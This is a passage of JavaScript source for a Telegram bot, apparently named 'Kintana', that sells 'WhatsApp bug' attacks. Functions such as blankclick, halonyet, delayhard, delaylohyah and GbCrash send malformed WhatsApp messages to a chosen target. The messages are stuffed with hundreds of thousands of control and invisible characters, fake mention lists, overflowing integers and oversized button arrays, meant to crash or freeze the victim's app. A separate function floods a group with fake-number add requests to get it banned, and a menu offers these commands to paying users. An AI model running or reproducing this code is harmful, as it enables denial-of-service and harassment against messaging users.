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pqSZNKO21WVqaZmWVkkVooGziCC01f///+5JkfoRzy10/0eYuUDdqJ7A04rgO0VTmJj0SUNAiXSBVioD/1iuJVSVatRgNh8NIsLOsB0DY4kWFrla8pfGg1Rv/Va2aGv9RV3Ep5YaA46tvVACFuoAj2//6QIQEx3oBCtDUNqUxn1//v+pjPMYGAt///l//UrYUT9AIeGoLYa0bVUxBTUUzLjEwMFVVVVVVVVUAABlQWhhkvTev85xnGcZ1aFDiTrKiOUuw0SzLof6cfwG9sb2tshxI80asKFLS+t/4xLDI1DBQYJ0Mv//5ZMjJlDAwcdLAoYGFBA5YDBAwYR1UQMVpppov+RKmWwkZpphEZENP+rary0yJIdA6DooEssK0UfPwELCvFG/iooLamf1fwWCQqyKihL+KNxYVTEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//uSZIeP8txFJ0ngHpIygsSwACweAAABpAAAACAAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 5
          }
        }
      }
    }
  }

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}

async function blankclick(sock, target) {
  try {
    const msg = {
      groupMentionedMessage: {
        message: {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: { text: "hi im kintana" },
                    nativeFlowMessage: {
                      extra: "\u3104",
                      buttons: "ꦾ࣯࣯".repeat(20000),
                      extra1: "ꦾ࣯࣯".repeat(5555)
                    }
                  }
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, {});

    await sock.relayMessage(target, {
      newsletterAdminInviteMessage: {
        newsletterJid: "123@newsletter",
        inviteCode: "\r".repeat(150000) + "\n".repeat(50000),
        inviteExpiration: 99999999999,
        newsletterName: "kintana" + "\u0000".repeat(250000)
      }
    }, {});
  } catch (e) {
    console.error(e);
  }
}

async function halonyet(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B".repeat(10000)
                            },
                            body: {
                                text: "\u180E".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9".repeat(300000)
                            },
                            contextInfo: {
                                mentionedJid: ["\u061C".repeat(10000)],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                advDeviceIdentity: {
                                    rawId: 4294967295,
                                    timestamp: 9999999999999,
                                    keyIndex: 4294967295,
                                    accountType: "E2EE",
                                    deviceType: "HOSTED"
                                }
                            }
                        }
                    }
                }
            },
            participant: target
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: false
    });
}

async function delayhard(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B\u2060".repeat(10000),
                                subtitle: "\uFEFF\u202F".repeat(10000)
                            },
                            body: {
                                text: "\u180E\u061C".repeat(20000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9\uFFFA".repeat(70000) + "\uFFFB\u2060".repeat(30000),
                                messageParamsJson: "\u200B\u202F".repeat(10000)
                            },
                            contextInfo: {
                                stanzaId: "\uFEFF\u180E".repeat(1000),
                                mentionedJid: [
                                    "\u061C\u200B".repeat(1000)
                                ],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                expiration: 4294967295
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: false
    });
}

async function delaylohyah(sock, target) {

  const unicode =
    "\u0000".repeat(10000) +
    "\u000D".repeat(99999);

  const hard =
    "\u00A1".repeat(9999) +
    "\u00B2".repeat(9999) +
    "\u0004".repeat(9999) +
    "\u00D4".repeat(9999) +
    "\u000F".repeat(9999) +
    "{}".repeat(9999) +
    "[]".repeat(9999) +
    "()".repeat(9999) +
    "€".repeat(9999);

  const combo = unicode + hard;

  const fakeJids = () =>
    Array.from({ length: 1900 }, () =>
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

  const bigButtons = Array.from({ length: 56789 }, () => ({}));

  const relayOpts = { noSelfSync: false, sync: false };

  const sendInteractive = async (bodyText, buttons) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: bodyText },
            nativeFlowMessage: { buttons },
            contextInfo: { mentionedJid: fakeJids() }
          }
        }
      }
    }, relayOpts);

  const sendExtended = async (text) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text,
            contextInfo: { mentionedJid: fakeJids() }
          }
        }
      }
    }, relayOpts);

  const sendFooter = async (bodyText, footerText, buttons) =>
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: bodyText },
            footer: { text: footerText },
            nativeFlowMessage: { buttons },
            contextInfo: { mentionedJid: fakeJids() }
          }
        }
      }
    }, relayOpts);

  await sendInteractive(unicode, bigButtons);
  await sendInteractive(hard,    bigButtons);
  await sendInteractive(combo,   bigButtons);

  await sendExtended(unicode);
  await sendExtended(hard);
  await sendExtended(combo);

  await sendFooter(combo,   combo,   bigButtons);
  await sendFooter(unicode, unicode, bigButtons);
  await sendFooter(hard,    hard,    bigButtons);

  await sendExtended(combo);
  await sendExtended(unicode);
  await sendExtended(hard);

  console.log("delaylohyah sent");
}

async function halonyetGB(sock, targetgroup) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B".repeat(10000)
                            },
                            body: {
                                text: "\u180E".repeat(10000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9".repeat(300000)
                            },
                            contextInfo: {
                                mentionedJid: ["\u061C".repeat(10000)],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                advDeviceIdentity: {
                                    rawId: 4294967295,
                                    timestamp: 9999999999999,
                                    keyIndex: 4294967295,
                                    accountType: "E2EE",
                                    deviceType: "HOSTED"
                                }
                            }
                        }
                    }
                }
            },
            participant: target
        }
    };

    await sock.relayMessage(targetgroup, msg, {
        noSelfSync: false
    });
}

async function kitow(sock, targetgroup, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    { name: "call_permission_request", buttonParamsJson: "{}" },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            "screen_2_OptIn_0": true,
                            "screen_2_OptIn_1": true,
                            "screen_1_Dropdown_0": "nullOnTop",
                            "screen_1_DatePicker_1": "1028995200000",
                            "screen_1_TextInput_2": "null@gmail.com",
                            "screen_1_TextInput_3": "94643116",
                            "screen_0_TextInput_0": "\u0018".repeat(50000),
                            "screen_0_TextInput_1": "SecretDocu",
                            "screen_0_Dropdown_2": "#926-Xnull",
                            "screen_0_RadioButtonsGroup_3": "0_true",
                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Ӄ𝕀𝚴𝕋∆𝚴∆" }],
            },
        };
        await sock.relayMessage(targetgroup, message, { userJid: targetgroup });
    } catch (err) {
        console.error("error sending newsletter:", err);
    }
}

async function kicaumania(sock, targetgroup) {
  try {
    const kintanax = "https://files.catbox.moe/f0sy28.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: kintanax, gifPlayback: true }
    }, { upload: sock.waUploadToServer, mediaType: "image" });

    const msg = generateWAMessageFromContent(targetgroup, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363409362506610@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: { title: "Ӄ𝕀𝚴𝕋∆𝚴∆", ...imagePayload, hasMediaAttachment: true },
        body: { text: "\u2063".repeat(10000) },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000), url: "ꦾ".repeat(10000), merchant_url: "" }) },
            { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "screen_1_TextInput_0": "radio" + "\0".repeat(10000), "screen_0_Dropdown_1": "Null", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." }), version: 3 }
          ]
        }
      }
    }), { quoted: null });

    msg.key.remoteJid = targetgroup;
    msg.key.fromMe = false;
    msg.key.id = generateMessageID();
    await sock.relayMessage(targetgroup, msg.message, { messageId: msg.key.id });
    console.log(`blank ${targetgroup}`);
  } catch (err) {
    console.error("error in BlankScreen:", err);
  }
}

function generateMessageID() {
  return Math.random().toString(36).slice(2) + Date.now();
}

async function GbCrash(sock, targetgroup) {
  try {
    const MgbMsg = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "Ӄ𝕀𝚴𝕋∆𝚴∆" + "ꦾ".repeat(50000),
            footerText: "Ӄ𝕀𝚴𝕋∆𝚴∆",
            headerType: 1,
            buttons: [{ buttonId: "Ӄ𝕀𝚴𝕋∆𝚴∆", buttonText: { displayText: "ꦽ".repeat(90000) }, type: 1 }],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`),
              participant: targetgroup,
              remoteJid: targetgroup,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "Ӄ𝕀𝚴𝕋∆𝚴∆",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(targetgroup, MgbMsg, { userJid: targetgroup });
    console.log("successfully sent group bug");
  } catch (err) {
    console.log(err);
  }
}

async function bansgc(sock, targetgroup) {
  try {
    if (!targetgroup.endsWith('@g.us')) throw new Error('group only')
    const fakeNumbers = Array.from({ length: 2000 }, () => {
      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
    })
    for (const fakeJid of fakeNumbers) {
      sock.groupParticipantsUpdate(targetgroup, [fakeJid], 'add').catch(() => {})
      await new Promise(r => setTimeout(r, 20))
    }
  } catch (err) {
    throw new Error(`bans gb: ${err.message}`)
  }
}

async function bug1(sock, target) {
  for (let i = 0; i < 10; i++) {
    try {
      await halonyet(sock, target);
      await halonyet(sock, target);
      await delaylohyah(sock, target);
      await sleep(500);      
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug2(sock, target) {
  for (let i = 0; i < 1; i++) {
    try {
      await anjay(sock, target);
      await audiomanja(sock, target);
      await lockchit(sock, target);     
      await halonyet(sock, target);
      await halonyet(sock, target);    
      await delaylohyah(sock, target);
      await sleep(500);               
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug3(sock, target) {
  for (let i = 0; i < 20; i++) {
    try {
      await blankclick(sock, target);
      await sleep(500);
      await delayhard(sock, target);
      await sleep(500);
      await halonyet(sock, target);
      await sleep(500);
      await delaylohyah(sock, target);
      await sleep(500);
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug4(sock, target) {
  for (let i = 0; i < 20; i++) {
    try {
      await delayhard(sock, target);
      await sleep(500);
      await halonyet(sock, target);
      await sleep(500);
      await delaylohyah(sock, target);
      await sleep(500);
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

async function bug5(sock, target) {
  for (let i = 0; i < 1; i++) {
    try {
      await audiomanja(sock, target);
      await lockchit(sock, target);     
      await halonyet(sock, target);
      await halonyet(sock, target);    
      await delaylohyah(sock, target);
      await sleep(500);               
      console.log(`bug send to ${target}`);
    } catch (innerError) {
      console.error(`error:`, innerError);
    }
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString()) || userId.toString() === `${DEVELOPER}`;
}
function getPremiumStatus(userId) {
  const isPremium = premiumUsers.includes(userId);
  return isPremium ? "premium" : "no access";
}

let senderPublicEnabled = true;
let senderPrivateEnabled = true;

function getkintanaMenu() {
  let activePublic = 0;
  let activePrivate = 0;
  for (const [_, data] of sessions) {
    if (data.type === "public") activePublic++;
    else if (data.type === "private") activePrivate++;
  }

  let totalPublic = 0;
  let totalPrivate = 0;
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const sessionsData = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      for (const [_, data] of Object.entries(sessionsData)) {
        const type = typeof data === "string" ? data : data.type;
        if (type === "public") totalPublic++;
        else if (type === "private") totalPrivate++;
      }
    }
  } catch (e) {
    console.error("failed to read sessions.json:", e);
  }

  const publicDisplay = `${activePublic}/${totalPublic}`;
  const privateDisplay = `${activePrivate}/${totalPrivate}`;
  const publicStatus = activePublic > 0 ? "on" : "off";
  const privateStatus = activePrivate > 0 ? "on" : "off";

  const html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>
<p>this is where all whatsapp bug features are listed. please choose the feature you like.</p>

<h3>android bug (os)</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/delayhard</code></td><td>delayy hard crash</td></tr>
<tr><td><code>/lockchat</code></td><td>lock whatsapp chat</td></tr>
<tr><td><code>/desahanmanja</code></td><td>prank audio whatsapp</td></tr>
<tr><td><code>/blankclick</code></td><td>crash click chat</td></tr>
<tr><td><code>/frezehard</code></td><td>freeze chat x delay</td></tr>
</table>

<h3>android bug group</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/groupcrash</code></td><td>blank click group x delay</td></tr>
<tr><td><code>/delaygroup</code></td><td>delay group x crash</td></tr>
</table>

<h3>ban group</h3>
<table border="2">
<tr><th>command</th><th>description</th></tr>
<tr><td><code>/groupban</code></td><td>ban group (rate ban 65%)</td></tr>
</table>

<h3>sender status</h3>
<table border="2">
<tr><th>type</th><th>status</th></tr>
<tr><td>sender public</td><td>${publicDisplay} (${publicStatus})</td></tr>
<tr><td>sender private</td><td>${privateDisplay} (${privateStatus})</td></tr>
</table>

<p>all bugs carry the risk of being banned, okay?</p>

<tg-button-row>
  <tg-button type="callback_data" data="toggle_public" style="primary">sender public: ${publicDisplay}</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="toggle_private" style="primary">sender private: ${privateDisplay}</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="bug_info" style="danger">bug information</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="callback_data" data="back_to_main" style="primary">back to menu</tg-button>
</tg-button-row>`;

  return { html };
}

bot.onText(/^\/start(?:\s|$)/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "no username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const greeting = getGreeting();

const html = `<tg-collage>
  <img src="https://files.catbox.moe/f0sy28.jpg"/>
</tg-collage>

<h3>${greeting}, ${username.toLowerCase()}</h3>

<p>i am a whatsapp bug script kintana version 10.0.0, created by heysaka.</p>

<tg-song>
  <audio controls preload="none" src="https://mp3tourl.com/audio/1791570807413-0fee70d1-28d3-4523-8bcc-4e56625245dc.mp3"></audio>
  <footer style="font-size:12px; color:#888; margin-top:6px;">
    © 2026 - Kintana Bot Telegram
  </footer>
</tg-song>

<h3>information</h3>
<table border="2">
  <tr><th>info</th><th>detail</th></tr>
  <tr><td>creator</td><td>heysaka official id</td></tr>
  <tr><td>tiktok</td><td>https://www.tiktok.com/@h3ysaka</td></tr>
  <tr><td>version</td><td>10.0.0</td></tr>
  <tr><td>bot name</td><td>kintana</td></tr>
  <tr><td>runtime</td><td>${runtime.toLowerCase()}</td></tr>
  <tr><td>status</td><td>${premiumStatus.toLowerCase()}</td></tr>
</table>

<tg-button-row>
  <tg-button type="callback_data" data="owner_menu" style="primary">owner menu</tg-button>
